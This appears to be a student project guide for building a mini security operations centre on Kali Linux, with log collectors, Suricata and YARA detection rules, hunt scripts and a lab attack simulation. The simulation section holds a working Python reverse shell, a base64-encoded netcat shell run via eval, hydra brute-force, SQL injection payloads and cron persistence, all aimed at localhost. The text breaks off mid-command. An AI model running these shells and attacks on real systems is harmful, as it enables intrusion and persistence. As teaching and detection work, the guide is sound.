# ISS-Project-Group3
# Mini SOC: Full Step-by-Step Guide
### Log Collection · Detection Engineering · Threat Hunting · Incident Simulation
**Platform:** Kali Linux | **Framework:** MITRE ATT&CK | **Tools:** Suricata, Zeek, YARA, Python, Wireshark, tcpdump, Nmap

---

## Table of Contents

1. [Environment Setup](#1-environment-setup)
2. [Phase 1 – Architecture & Engineering (Log Collection)](#2-phase-1--architecture--engineering)
3. [Phase 2 – Detection Engineering (10+ Rules)](#3-phase-2--detection-engineering)
4. [Phase 3 – Defence in Depth (10+ Hunt Rules)](#4-phase-3--defence-in-depth)
5. [Phase 4 – SOC Incident Simulation (3 Attacks)](#5-phase-4--soc-incident-simulation)
6. [MITRE ATT&CK Mapping Reference](#6-mitre-attck-mapping-reference)

---

## 1. Environment Setup

### 1.1 Prerequisites
- Kali Linux (2024.x or later) — bare-metal or VM (VMware/VirtualBox)
- Minimum: 4 CPU cores, 8 GB RAM, 60 GB disk

### 1.2 Update Kali and Install Core Tools

```bash
sudo apt update && sudo apt full-upgrade -y

# Install all core SOC tools in one pass
sudo apt install -y \
    suricata \
    yara \
    wireshark \
    tcpdump \
    nmap \
    python3-pip \
    apache2 \
    fail2ban \
    git \
    jq \
    curl \
    net-tools

#Install rsyslog
sudo apt install -y rsyslog

#Install zeek
echo 'deb http://download.opensuse.org/repositories/security:/zeek/Debian_12/ /' | sudo tee /etc/apt/sources.list.d/security:zeek.list
curl -fsSL https://download.opensuse.org/repositories/security:zeek/Debian_12/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg > /dev/null
sudo apt update
sudo apt install zeek

#Install hydra
sudo apt install hydra -y

# Python libraries for log parsing and alerting
sudo apt install -y python3-pandas python3-watchdog python3-requests python3-colorama python3-scapy
```

### 1.3 Directory Structure

```bash
mkdir -p ~/mini-soc/{logs,rules,scripts,alerts,pcaps,reports}
mkdir -p ~/mini-soc/logs/{auth,web,zeek,suricata,raw}
mkdir -p ~/mini-soc/rules/{suricata,yara,hunt}
```

Your layout will be:
```
~/mini-soc/
├── logs/
│   ├── auth/          # auth.log copies
│   ├── web/           # Apache access/error logs
│   ├── zeek/          # Zeek conn.log, http.log, dns.log, etc.
│   ├── suricata/      # eve.json, fast.log
│   └── raw/           # tcpdump pcap files
├── rules/
│   ├── suricata/      # .rules files
│   ├── yara/          # .yar files
│   └── hunt/          # hunt query scripts
├── scripts/           # Python collection/alerting scripts
├── alerts/            # generated alert files
├── pcaps/             # saved packet captures
└── reports/           # incident reports
```

---

## 2. Phase 1 – Architecture & Engineering

### 2.1 Data Source 1: Linux Authentication Logs (auth.log)

**What it captures:** SSH logins, sudo usage, failed passwords, PAM events.
**MITRE:** T1110 (Brute Force), T1078 (Valid Accounts), T1548 (Abuse Elevation)

```bash
# Enable rsyslog if not running
sudo systemctl enable rsyslog && sudo systemctl start rsyslog

# Confirm auth.log is being written
tail -f /var/log/auth.log
```

**Python collector – real-time auth log monitor:**

```python
# ~/mini-soc/scripts/auth_collector.py
import subprocess, time, json, os
from datetime import datetime

AUTH_LOG = "/var/log/auth.log"
OUTPUT    = os.path.expanduser("~/mini-soc/logs/auth/auth_events.jsonl")

PATTERNS = {
    "failed_ssh"      : "Failed password",
    "accepted_ssh"    : "Accepted password",
    "sudo_attempt"    : "sudo:",
    "new_session"     : "New session",
    "session_closed"  : "session closed",
    "invalid_user"    : "Invalid user",
}

def parse_line(line):
    ts = datetime.now().isoformat()
    event_type = "unknown"
    for label, keyword in PATTERNS.items():
        if keyword in line:
            event_type = label
            break
    return {"timestamp": ts, "event_type": event_type, "raw": line.strip()}

def tail_log(path):
    proc = subprocess.Popen(["tail", "-F", path], stdout=subprocess.PIPE, text=True)
    with open(OUTPUT, "a") as out:
        for line in proc.stdout:
            event = parse_line(line)
            out.write(json.dumps(event) + "\n")
            out.flush()
            print(f"[AUTH] {event['event_type']} → {line.strip()[:80]}")

if __name__ == "__main__":
    print(f"[*] Monitoring {AUTH_LOG}")
    tail_log(AUTH_LOG)
```

```bash
# Run in background
python3 ~/mini-soc/scripts/auth_collector.py &
```

---

### 2.2 Data Source 2: Apache Web Server Logs

**What it captures:** HTTP requests, response codes, client IPs, user agents.
**MITRE:** T1190 (Exploit Public-Facing App), T1059 (Command Injection), T1083 (File Discovery)

```bash
# Start Apache
sudo systemctl enable apache2 && sudo systemctl start apache2

# Confirm logs are writing
sudo tail -f /var/log/apache2/access.log
```

**Python web log collector:**

```python
# ~/mini-soc/scripts/web_collector.py
import subprocess, json, os, re
from datetime import datetime

ACCESS_LOG = "/var/log/apache2/access.log"
OUTPUT     = os.path.expanduser("~/mini-soc/logs/web/web_events.jsonl")

# Suspicious patterns to flag immediately
SUSPICIOUS = [
    r"\.\.\/",          # Path traversal
    r"UNION\s+SELECT",  # SQL Injection
    r"<script",         # XSS
    r"cmd=|exec=|system\(",  # Command injection
    r"/etc/passwd",     # LFI
    r"wp-admin|phpmyadmin",  # CMS probing
    r"nikto|sqlmap|nmap|masscan",  # Known scanner UAs
]

def parse_web_line(line):
    ts    = datetime.now().isoformat()
    flags = [p for p in SUSPICIOUS if re.search(p, line, re.IGNORECASE)]
    return {
        "timestamp"  : ts,
        "suspicious" : len(flags) > 0,
        "flags"      : flags,
        "raw"        : line.strip()
    }

def tail_web(path):
    proc = subprocess.Popen(["tail", "-F", path], stdout=subprocess.PIPE, text=True)
    with open(OUTPUT, "a") as out:
        for line in proc.stdout:
            event = parse_web_line(line)
            out.write(json.dumps(event) + "\n")
            out.flush()
            if event["suspicious"]:
                print(f"[WEB ⚠] FLAGS={event['flags']} → {line.strip()[:100]}")

if __name__ == "__main__":
    print(f"[*] Monitoring {ACCESS_LOG}")
    tail_web(ACCESS_LOG)
```

```bash
python3 ~/mini-soc/scripts/web_collector.py &
```

---

### 2.3 Data Source 3: Zeek (Network Analysis)

**What it captures:** Connection metadata, DNS queries, HTTP sessions, SSL certs, file transfers.
**MITRE:** T1071 (App Layer Protocol), T1048 (Exfiltration Over Alt Protocol), T1046 (Network Scan)

```bash
# Configure Zeek to monitor your interface (replace eth0 with yours)
ip a   # find your interface name (e.g., eth0, ens33)

sudo /opt/zeek/bin/zeek -i eth0 &    # quick start for testing

sudo ln -s /opt/zeek/bin/zeek /usr/local/bin/zeek
sudo ln -s /opt/zeek/bin/zeekctl /usr/local/bin/zeekctl

sudo zeekctl deploy
sudo zeekctl status
```

Zeek writes logs to `/var/log/zeek/current/`:
- `conn.log`   — all TCP/UDP/ICMP connections
- `dns.log`    — DNS queries and responses
- `http.log`   — HTTP requests (URL, method, UA, status)
- `ssl.log`    — TLS/SSL handshakes and certificates
- `files.log`  — files seen on the wire

**Collector: copy Zeek logs to your SOC directory:**

```bash
# ~/mini-soc/scripts/zeek_sync.sh
#!/bin/bash
while true; do
    cp /opt/zeek/logs/current/conn.log   ~/mini-soc/logs/zeek/conn_$(date +%H%M%S).log 2>/dev/null
    cp /opt/zeek/logs/current/dns.log    ~/mini-soc/logs/zeek/dns_$(date +%H%M%S).log  2>/dev/null
    cp /opt/zeek/logs/current/http.log   ~/mini-soc/logs/zeek/http_$(date +%H%M%S).log 2>/dev/null
    sleep 60
done
```

```bash
chmod +x ~/mini-soc/scripts/zeek_sync.sh
~/mini-soc/scripts/zeek_sync.sh &
```

---

### 2.4 Data Source 4: Suricata (NIDS / IDS)

**What it captures:** Network alerts, protocol anomalies, signature matches — outputs to `eve.json`.
**MITRE:** T1046, T1059, T1595 (Active Scanning)

```bash
# Configure Suricata to your interface
sudo nano /etc/suricata/suricata.yaml
# Set:  af-packet:
#         - interface: eth0   ← your interface

# Point rule directories to your custom rules
# Under rule-files: add - /home/kali/mini-soc/rules/suricata/*.rules

# Enable eve.json output (should be on by default):
# outputs:
#   - eve-log:
#       enabled: yes
#       filename: /var/log/suricata/eve.json

sudo systemctl enable suricata && sudo systemctl start suricata
sudo tail -f /var/log/suricata/eve.json | jq .
```

**Collector: real-time Suricata alert monitor:**

```python
# ~/mini-soc/scripts/suricata_collector.py
import subprocess, json, os

EVE_LOG = "/var/log/suricata/eve.json"
OUTPUT  = os.path.expanduser("~/mini-soc/logs/suricata/alerts.jsonl")

def tail_eve(path):
    proc = subprocess.Popen(["tail", "-F", path], stdout=subprocess.PIPE, text=True)
    with open(OUTPUT, "a") as out:
        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                event = json.loads(line)
                out.write(line + "\n")
                out.flush()
                if event.get("event_type") == "alert":
                    sig = event.get("alert", {}).get("signature", "unknown")
                    src = event.get("src_ip", "?")
                    dst = event.get("dest_ip", "?")
                    print(f"[SURICATA 🚨] {sig} | {src} → {dst}")
            except json.JSONDecodeError:
                pass

if __name__ == "__main__":
    print(f"[*] Monitoring {EVE_LOG}")
    tail_eve(EVE_LOG)
```

```bash
python3 ~/mini-soc/scripts/suricata_collector.py &
```

---

### 2.5 Data Source 5: tcpdump (Raw Packet Capture)

**What it captures:** Raw network traffic in pcap format — ground truth for all other tools.

```bash
# Capture everything and rotate every 5 minutes (300 seconds), keeping 12 files
sudo tcpdump -i eth0 -w ~/mini-soc/pcaps/capture-%Y%m%d%H%M%S.pcap \
  -G 300 -W 12 -z gzip -Z root &

# Quick targeted capture (e.g. only port 22 traffic)
sudo tcpdump -i eth0 -w ~/mini-soc/pcaps/ssh.pcap port 22 &
```

---

### 2.6 Central Aggregator: SIEM-like Log Dashboard

```python
# ~/mini-soc/scripts/siem_aggregator.py
# Tails all log files and prints a colour-coded unified feed

import subprocess, threading, json, os
from colorama import Fore, Style, init
init()

SOURCES = {
    "AUTH"     : (os.path.expanduser("~/mini-soc/logs/auth/auth_events.jsonl"),    Fore.CYAN),
    "WEB"      : (os.path.expanduser("~/mini-soc/logs/web/web_events.jsonl"),      Fore.YELLOW),
    "SURICATA" : (os.path.expanduser("~/mini-soc/logs/suricata/alerts.jsonl"),     Fore.RED),
}

def tail(source_name, filepath, color):
    proc = subprocess.Popen(["tail", "-F", filepath], stdout=subprocess.PIPE, text=True)
    for line in proc.stdout:
        line = line.strip()
        if not line: continue
        try:
            event = json.loads(line)
            ts    = event.get("timestamp", "")[:19]
            msg   = event.get("raw", str(event))[:100]
            flag  = "⚠ " if event.get("suspicious") or event.get("event_type") == "alert" else "  "
            print(f"{color}[{source_name}]{flag}{ts} | {msg}{Style.RESET_ALL}")
        except:
            print(f"{color}[{source_name}] {line[:120]}{Style.RESET_ALL}")

threads = []
for name, (path, color) in SOURCES.items():
    t = threading.Thread(target=tail, args=(name, path, color), daemon=True)
    t.start()
    threads.append(t)

print("[*] SIEM Aggregator running — press Ctrl+C to stop")
try:
    for t in threads: t.join()
except KeyboardInterrupt:
    print("\n[*] Shutting down aggregator")
```

```bash
python3 ~/mini-soc/scripts/siem_aggregator.py
```

---

## 3. Phase 2 – Detection Engineering

### Overview
You will create **12 detection rules** across three engines:
- **Suricata rules** (network-layer, signature-based)
- **YARA rules** (file/memory pattern matching)
- **Python detection scripts** (log-based behavioural)

---

### 3.1 Suricata Rules (6 Rules)

Save all rules to `~/mini-soc/rules/suricata/custom.rules`

```bash
nano ~/mini-soc/rules/suricata/custom.rules
```

**Rule 1 – SSH Brute Force Detection**
*(MITRE T1110.001 – Brute Force: Password Guessing)*
```
alert tcp any any -> $HOME_NET 22 (msg:"MINI-SOC SSH Brute Force Attempt"; \
  flow:to_server; \
  threshold: type threshold, track by_src, count 5, seconds 60; \
  classtype:attempted-admin; sid:9000001; rev:1;)
```

**Rule 2 – Nmap SYN Scan Detection**
*(MITRE T1046 – Network Service Scanning)*
```
alert tcp any any -> $HOME_NET any (msg:"MINI-SOC Nmap SYN Scan"; \
  flags:S,12; \
  threshold: type threshold, track by_src, count 100, seconds 10; \
  classtype:network-scan; sid:9000002; rev:1;)
```

**Rule 3 – SQL Injection Attempt via HTTP**
*(MITRE T1190 – Exploit Public-Facing Application)*
```
alert http any any -> $HOME_NET $HTTP_PORTS (msg:"MINI-SOC SQL Injection Attempt"; \
  flow:to_server,established; \
  content:"UNION"; http_uri; nocase; \
  content:"SELECT"; http_uri; nocase; distance:0; \
  classtype:web-application-attack; sid:9000003; rev:1;)
```

**Rule 4 – Path Traversal / LFI Attempt**
*(MITRE T1083 – File and Directory Discovery)*
```
alert http any any -> $HOME_NET $HTTP_PORTS (msg:"MINI-SOC Path Traversal Attempt"; \
  flow:to_server,established; \
  content:"../"; http_uri; \
  classtype:web-application-attack; sid:9000004; rev:1;)
```

**Rule 5 – ICMP Tunnel (Large ICMP Payload)**
*(MITRE T1048.003 – Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol)*
```
alert icmp any any -> any any (msg:"MINI-SOC ICMP Tunnel - Large Payload"; \
  dsize:>512; \
  classtype:policy-violation; sid:9000005; rev:1;)
```

**Rule 6 – DNS Query to Known C2 Domain Pattern**
*(MITRE T1071.004 – Application Layer Protocol: DNS)*
```
alert dns any any -> any 53 (msg:"MINI-SOC Suspicious DNS TXT Record Query"; \
  dns.query; content:".tk"; endswith; \
  classtype:trojan-activity; sid:9000006; rev:1;)
```

**Reload Suricata rules:**
```bash
sudo suricata-update
sudo systemctl reload suricata
# Or:
sudo kill -USR2 $(pidof suricata)
```

---

### 3.2 YARA Rules (4 Rules)

Save to `~/mini-soc/rules/yara/`

**Rule 1 – Detect Netcat (Reverse Shell Tool)**
*(MITRE T1059 – Command and Scripting Interpreter)*

```yara
# ~/mini-soc/rules/yara/netcat.yar
rule Netcat_Reverse_Shell {
    meta:
        description = "Detects netcat binary or script usage for reverse shells"
        author      = "Mini-SOC Group 3"
        mitre       = "T1059"
        severity    = "high"
    strings:
        $s1 = "nc -e /bin/bash" ascii
        $s2 = "nc -e /bin/sh"  ascii
        $s3 = "ncat --exec"    ascii
        $s4 = { 2F 62 69 6E 2F 62 61 73 68 }   // /bin/bash in hex
    condition:
        any of ($s1, $s2, $s3) or $s4
}
```

**Rule 2 – Detect Mimikatz-style Credential Dumping Keywords**
*(MITRE T1003 – OS Credential Dumping)*

```yara
# ~/mini-soc/rules/yara/mimikatz.yar
rule Mimikatz_Credential_Dumper {
    meta:
        description = "Detects strings associated with Mimikatz credential dumping"
        author      = "Mini-SOC Group 3"
        mitre       = "T1003"
        severity    = "critical"
    strings:
        $m1 = "sekurlsa::logonpasswords" ascii nocase
        $m2 = "lsadump::sam"            ascii nocase
        $m3 = "privilege::debug"        ascii nocase
        $m4 = "mimikatz"               ascii nocase
        $m5 = "SekurlsaLogonPasswords" wide
    condition:
        2 of ($m*)
}
```

**Rule 3 – Detect Python Reverse Shell**
*(MITRE T1059.006 – Python)*

```yara
# ~/mini-soc/rules/yara/python_revshell.yar
rule Python_Reverse_Shell {
    meta:
        description = "Detects Python reverse shell patterns in scripts"
        author      = "Mini-SOC Group 3"
        mitre       = "T1059.006"
        severity    = "high"
    strings:
        $p1 = "import socket" ascii
        $p2 = "import subprocess" ascii
        $p3 = "s.connect" ascii
        $p4 = "/bin/bash" ascii
        $p5 = "os.dup2" ascii
    condition:
        $p1 and $p3 and ($p4 or $p5)
}
```

**Rule 4 – Detect Base64-Encoded Payload Execution**
*(MITRE T1027 – Obfuscated Files or Information)*

```yara
# ~/mini-soc/rules/yara/base64_payload.yar
rule Base64_Encoded_Exec {
    meta:
        description = "Detects base64-encoded command execution in shell scripts"
        author      = "Mini-SOC Group 3"
        mitre       = "T1027"
        severity    = "medium"
    strings:
        $b1 = "base64 -d" ascii
        $b2 = "echo " ascii
        $b3 = "| bash" ascii
        $b4 = "| sh"   ascii
        $b5 = "eval $(echo" ascii
    condition:
        ($b1 and ($b3 or $b4)) or $b5
}
```

**Run YARA against a target directory:**

```bash
for rule in ~/mini-soc/rules/yara/*.yar; do
    echo "[*] Running: $rule"
    yara -r "$rule" /home/ /tmp/ /var/www/html/ 2>/dev/null
done
```

---

### 3.3 Python Log-Based Detection Rules (2 Scripts)

**Detection Rule 1 – SSH Brute Force from Auth Log**
*(MITRE T1110.001)*

```python
# ~/mini-soc/scripts/detect_ssh_bruteforce.py
import json, os
from collections import defaultdict
from datetime import datetime

LOG_FILE   = os.path.expanduser("~/mini-soc/logs/auth/auth_events.jsonl")
ALERT_FILE = os.path.expanduser("~/mini-soc/alerts/ssh_brute.txt")
THRESHOLD  = 5   # failed attempts = alert

failed_attempts = defaultdict(int)

with open(LOG_FILE) as f:
    for line in f:
        try:
            event = json.loads(line)
            if event.get("event_type") == "failed_ssh":
                raw   = event.get("raw", "")
                # Extract IP (crude but effective for auth.log)
                parts = raw.split()
                for i, p in enumerate(parts):
                    if p in ("from", "rhost"):
                        ip = parts[i+1] if i+1 < len(parts) else "?"
                        failed_attempts[ip] += 1

alerts = []
for ip, count in failed_attempts.items():
    if count >= THRESHOLD:
        msg = f"[ALERT] SSH Brute Force | IP: {ip} | Attempts: {count} | MITRE: T1110.001"
        alerts.append(msg)
        print(msg)

with open(ALERT_FILE, "w") as f:
    f.write("\n".join(alerts))

print(f"[*] {len(alerts)} brute-force IPs detected.")
```

**Detection Rule 2 – Web Scanner User-Agent Detection**
*(MITRE T1595.002 – Active Scanning: Vulnerability Scanning)*

```python
# ~/mini-soc/scripts/detect_web_scanners.py
import json, os

LOG_FILE   = os.path.expanduser("~/mini-soc/logs/web/web_events.jsonl")
ALERT_FILE = os.path.expanduser("~/mini-soc/alerts/web_scanners.txt")

SCANNER_UAS = ["nikto", "sqlmap", "nmap", "masscan", "zgrab",
                "dirbuster", "gobuster", "wfuzz", "burpsuite"]

alerts = []
with open(LOG_FILE) as f:
    for line in f:
        try:
            event = json.loads(line)
            raw   = event.get("raw", "").lower()
            hits  = [ua for ua in SCANNER_UAS if ua in raw]
            if hits:
                msg = f"[ALERT] Scanner UA Detected | Tools: {hits} | Line: {raw[:120]}"
                alerts.append(msg)
                print(msg)
        except:
            pass

with open(ALERT_FILE, "w") as f:
    f.write("\n".join(alerts))

print(f"[*] {len(alerts)} scanner events detected.")
```

---

## 4. Phase 3 – Defence in Depth

### Overview
Design and run **12 hunt rules** to proactively search for attacker activity. These go beyond reactive detection — you are hunting for TTPs that have not yet triggered an alert.

---

### Hunt Rule 1 – Login Outside Business Hours
*(MITRE T1078 – Valid Accounts)*

```python
# ~/mini-soc/rules/hunt/hunt_offhours_login.py
import json, os
from datetime import datetime

LOG = os.path.expanduser("~/mini-soc/logs/auth/auth_events.jsonl")
BUSINESS_START, BUSINESS_END = 8, 18   # 08:00–18:00

results = []
with open(LOG) as f:
    for line in f:
        try:
            e = json.loads(line)
            if e.get("event_type") in ("accepted_ssh", "new_session"):
                hour = datetime.fromisoformat(e["timestamp"]).hour
                if hour < BUSINESS_START or hour >= BUSINESS_END:
                    results.append(e)
                    print(f"[HUNT] Off-hours login at {e['timestamp']} | {e['raw'][:80]}")
        except: pass
print(f"[*] {len(results)} off-hours logins found.")
```

---

### Hunt Rule 2 – Multiple Failed Logins Followed by Success
*(MITRE T1110 – Brute Force → Valid Account)*

```python
# ~/mini-soc/rules/hunt/hunt_brute_then_success.py
import json, os
from collections import defaultdict

LOG = os.path.expanduser("~/mini-soc/logs/auth/auth_events.jsonl")

events_by_ip = defaultdict(list)
with open(LOG) as f:
    for line in f:
        try:
            e = json.loads(line)
            for kw in ["from", "rhost"]:
                if kw in e.get("raw",""):
                    parts = e["raw"].split()
                    for i, p in enumerate(parts):
                        if p == kw and i+1 < len(parts):
                            events_by_ip[parts[i+1]].append(e)
        except: pass

for ip, evs in events_by_ip.items():
    types = [e["event_type"] for e in evs]
    fails = types.count("failed_ssh")
    wins  = types.count("accepted_ssh")
    if fails >= 3 and wins >= 1:
        print(f"[HUNT ⚠] Brute-then-success for IP {ip}: {fails} fails → {wins} success | MITRE T1110")
```

---

### Hunt Rule 3 – Unusual SUDO Usage
*(MITRE T1548.003 – Sudo and Sudo Caching)*

```bash
# ~/mini-soc/rules/hunt/hunt_sudo.sh
#!/bin/bash
echo "[HUNT] Checking sudo usage..."
grep "sudo" /var/log/auth.log | grep -v "pam_unix\|session" | \
    awk '{print $1,$2,$3,$11,$12}' | sort | uniq -c | sort -rn | head -20
```

---

### Hunt Rule 4 – Large DNS Responses (DNS Tunneling)
*(MITRE T1048.003 – Exfiltration Over DNS)*

```bash
# ~/mini-soc/rules/hunt/hunt_dns.sh
#!/bin/bash
echo "Hunting for Large DNS Responses (Tunneling)"
awk 'NR>8 {if ($NF > 512) print "[HUNT] Large DNS answer:", $0}' ~/mini-soc/logs/zeek/dns_*.log 2>/dev/null | head -30

```

---

### Hunt Rule 5 – Non-Standard Ports for Common Protocols
*(MITRE T1571 – Non-Standard Port)*

```bash
# ~/mini-soc/rules/hunt/hunt_ports.sh
#!/bin/bash
echo "Hunting for HTTP on Non-Standard Ports"
awk 'NR>8 {
    if ($7=="tcp" && ($3!=80 && $3!=443 && $3!=8080) && $8~/http/)
        print "[HUNT] HTTP on non-std port:", $3, $0
}' ~/mini-soc/logs/zeek/conn_*.log 2>/dev/null | head -20

```

---

### Hunt Rule 6 – Port Scanning Fingerprint (Many Ports, One Source)
*(MITRE T1046 – Network Service Scanning)*

```bash
# ~/mini-soc/rules/hunt/hunt_scan.sh
#!/bin/bash
echo "Hunting for Port Scanning Fingerprints"
awk 'NR>8 {print $3, $5}' ~/mini-soc/logs/zeek/conn_*.log | \
    awk '{count[$2][$1]++} END {for(src in count) {n=0; for(p in count[src]) n++; if(n>20) print "[HUNT] Port scan from", src, ":", n, "ports"}}' 2>/dev/null

```

---

### Hunt Rule 7 – New User Account Created
*(MITRE T1136.001 – Create Account: Local Account)*

```bash
# ~/mini-soc/rules/hunt/hunt_new_users.sh
#!/bin/bash
echo "[HUNT] Checking for newly created accounts..."
grep "useradd\|adduser\|new user" /var/log/auth.log | \
    awk '{print "[HUNT] New user:", $0}'
```

---

### Hunt Rule 8 – Cron Job Modification
*(MITRE T1053.003 – Scheduled Task/Job: Cron)*

```bash
# ~/mini-soc/rules/hunt/hunt_cron.sh
#!/bin/bash
echo "Hunting for Modified Cron Jobs"
find /var/spool/cron /etc/cron* -newer /tmp/soc_baseline -type f 2>/dev/null | \
while read f; do echo "[HUNT] Modified cron: $f"; done

```

---

### Hunt Rule 9 – Processes Listening on Unexpected Ports
*(MITRE T1049 – System Network Connections Discovery)*

```bash
# ~/mini-soc/rules/hunt/hunt_open_ports.sh
#!/bin/bash
echo "[HUNT] Unexpected listening processes:"
ss -tlnp | awk 'NR>1 {
    if ($4 !~ /:22$|:80$|:443$|:53$/) 
        print "[HUNT] Unexpected listener:", $4, $6
}'
```

---

### Hunt Rule 10 – World-Readable SUID Binaries (Privilege Escalation Setup)
*(MITRE T1548.001 – Setuid and Setgid)*

```bash
# ~/mini-soc/rules/hunt/hunt_suid.sh
#!/bin/bash
echo "[HUNT] SUID binaries on filesystem:"
find / -perm -4000 -type f 2>/dev/null | while read f; do
    echo "[HUNT] SUID: $f"
done
```

---

### Hunt Rule 11 – High Data Transfer (Potential Exfiltration)
*(MITRE T1041 – Exfiltration Over C2 Channel)*

```bash
# ~/mini-soc/rules/hunt/hunt_exfil.sh
#!/bin/bash
echo "Hunting for High Data Transfers (Exfiltration)"
awk 'NR>8 {if ($10+0 > 10000000) print "[HUNT] Large transfer:", $3, "→", $5, "bytes:", $10}' \
    ~/mini-soc/logs/zeek/conn_*.log | head -20

```

---

### Hunt Rule 12 – Interactive Shell Spawned from Web Process
*(MITRE T1059.004 – Unix Shell / Web Shell)*

```bash
 ~/mini-soc/rules/hunt/hunt_webshell.sh
#!/bin/bash
echo "Hunting for Web Shells spawned by Apache"
ps auxf | awk '/apache/{found=1} found && /bash|sh/{print "[HUNT] Shell from web:", $0}'
grep "www-data" /var/log/auth.log | awk '{print "[HUNT] www-data event:", $0}'

```

---

### Run All Hunt Rules at Once

```bash
# ~/mini-soc/scripts/run_all_hunts.sh
#!/bin/bash
echo "============================================"
echo " MINI-SOC THREAT HUNTING RUN - $(date)"
echo "============================================"

for script in ~/mini-soc/rules/hunt/*.sh; do
    echo; echo "--- $script ---"
    bash "$script"
done

for script in ~/mini-soc/rules/hunt/*.py; do
    echo; echo "--- $script ---"
    python3 "$script"
done
```

```bash
chmod +x ~/mini-soc/scripts/run_all_hunts.sh
~/mini-soc/scripts/run_all_hunts.sh | tee ~/mini-soc/reports/hunt_report_$(date +%Y%m%d).txt
```

---

## 5. Phase 4 – SOC Incident Simulation

> **Ethics & Safety:** Run ALL attacks only on your own isolated lab environment — NEVER against systems you do not own or have written permission to test.

### 5.1 Lab Network Setup

```
┌─────────────────┐    ┌──────────────────────┐
│  ATTACKER VM    │    │   DEFENDER/SOC       │
│  (Kali Linux)   │◄──►│   (Kali Linux)       │
│  192.168.56.101 │    │   192.168.56.100     │
│                 │    │                      │
│                 │    │                      │
└─────────────────┘    └──────────────────────┘
      Host-Only / Internal Network
```

### Step 1: Start Your Background Collectors (Terminal 1)
First, turn on all your "Blue Team" sensors so they are actively listening.
```
python3 ~/mini-soc/scripts/auth_collector.py &
python3 ~/mini-soc/scripts/web_collector.py &
python3 ~/mini-soc/scripts/suricata_collector.py &
~/mini-soc/scripts/zeek_sync.sh &
sudo tcpdump -i eth0 -w ~/mini-soc/pcaps/live.pcap &
```

### Step 2: Launch the SIEM Dashboard (Terminal 1)
Run this command and leave this terminal tab open. This is your live dashboard, and you should switch back to look at it while you run the attacks in the next step!
```
python3 ~/mini-soc/scripts/siem_aggregator.py
```
### Step 3: Execute Attack Simulations (Terminal 2)
Switch to your second terminal. This is your "Red Team" terminal where you will fire off the attacks.

### Attack 1: SSH Brute Force
```
echo -e "password\n123456\nkali\nadmin\nroot\ntoor\nletmein" > /tmp/passwords.txt
hydra -l root -P /tmp/passwords.txt ssh://127.0.0.1 -t 4 -V
```
### Attack 2: Web Exploits (SQLi & Path Traversal)
```
sudo apt install php libapache2-mod-php -y
sudo systemctl restart apache2
sudo tee /var/www/html/search.php > /dev/null <<'EOF'
<?php
$q = $_GET['q'] ?? '';
echo "<h1>Search: " . htmlspecialchars($q) . "</h1>";
echo "<p>You searched for: $q</p>";
?>
EOF

curl "http://127.0.0.1/search.php?q=' UNION SELECT 1,2,3--"
curl "http://127.0.0.1/search.php?q=../../../../../etc/passwd"
sqlmap -u "http://127.0.0.1/search.php?q=1" --dbs --batch
```
### Attack 3: Malware & Persistence
```
1. Drop a fake Python reverse shell
cat > /tmp/fake_revshell.py << 'EOF'
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4444))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
EOF

# 2. Drop a fake obfuscated payload
cat > /tmp/obfuscated.sh << 'EOF'
#!/bin/bash
eval $(echo "bmMgLWUgL2Jpbi9iYXNo" | base64 -d)
EOF

# 3. Add fake cron persistence and simulate data exfiltration
(crontab -l 2>/dev/null; echo "* * * * * echo 'backdoor' > /tmp/cron_test.txt") | crontab -
ping -c 10 -s 1000 127.0.0.1
```
### Step 4: Run Post-Attack Detections (Terminal 3)
Switch to a brand new terminal. Now we check if the scripts and YARA rules you wrote caught the attacks after the fact.
```
Bash
python3 ~/mini-soc/scripts/detect_ssh_bruteforce.py
python3 ~/mini-soc/scripts/detect_web_scanners.py
for r in ~/mini-soc/rules/yara/*.yar; do yara -r "$r" /tmp/ 2>/dev/null; done
```
2. Final Threat Hunt Run
```
~/mini-soc/scripts/run_all_hunts.sh | tee ~/mini-soc/reports/hunt_report_$(date +%Y%m%d).txt
```
3. Verify Report Generation
```
ls ~/mini-soc/reports/
ls ~/mini-soc/alerts/
```
### Step 5: Extract Forensic Evidence

Run these commands to pull the specific logs for each attack and save them as permanent text files in your reports folder.

### Attack 1 Evidence: SSH Brute Force
This extracts the timestamps and IPs of the failed login attempts.
```
grep "Failed password" /var/log/auth.log | awk '{print $1,$2,$3,$9,$11}' | sort | uniq -c | sort -rn > ~/mini-soc/reports/attack1_ssh_brute.txt
```
### Attack 2 Evidence: Web Exploits
This filters your web logs for the specific SQL injection and Path Traversal payloads you fired.
```
grep -E "UNION|SELECT|\.\.\/|etc/passwd" /var/log/apache2/access.log > ~/mini-soc/reports/attack2_web.txt
```
### Attack 3 Evidence: Malware & Persistence
This builds a timeline by pulling your YARA hits, your modified crontab, and your Suricata network alerts, appending them all into one master file.
```
echo "=== Attack 3 Timeline ===" > ~/mini-soc/reports/attack3_revshell.txt
echo "YARA hits:" >> ~/mini-soc/reports/attack3_revshell.txt
yara -r ~/mini-soc/rules/yara/python_revshell.yar /tmp/ 2>/dev/null >> ~/mini-soc/reports/attack3_revshell.txt
yara -r ~/mini-soc/rules/yara/base64_payload.yar /tmp/ 2>/dev/null >> ~/mini-soc/reports/attack3_revshell.txt

echo "Cron persistence:" >> ~/mini-soc/reports/attack3_revshell.txt
crontab -l >> ~/mini-soc/reports/attack3_revshell.txt

echo "Suricata alerts:" >> ~/mini-soc/reports/attack3_revshell.txt
grep -E "ICMP|Tunnel|Shell" /var/log/suricata/fast.log >> ~/mini-soc/reports/attack3_r
```
### Step 6: Sanitize and Clean Up

Now that your evidence is safely secured in the ~/mini-soc/reports/ folder, it is time to remove the fake malware and backdoors so your Kali machine is secure and clean.

### Step 1: Remove the Cron Backdoor
This command reads your current scheduled tasks, filters out the one containing the word "backdoor", and saves the clean list back to the system.
```
crontab -l | grep -v backdoor | crontab -
```
### Step 2: Delete the Dropped Malware Files
This command securely deletes the fake payloads and password lists you created in the /tmp/ directory.
```
rm -f /tmp/fake_revshell.py /tmp/obfuscated.sh /tmp/cron_test.txt /tmp/passwords.txt
```
(Optional but recommended): If you want to delete that fake vulnerable web page you built for Attack 2 so it isn't sitting on your server anymore, you can run this:
```
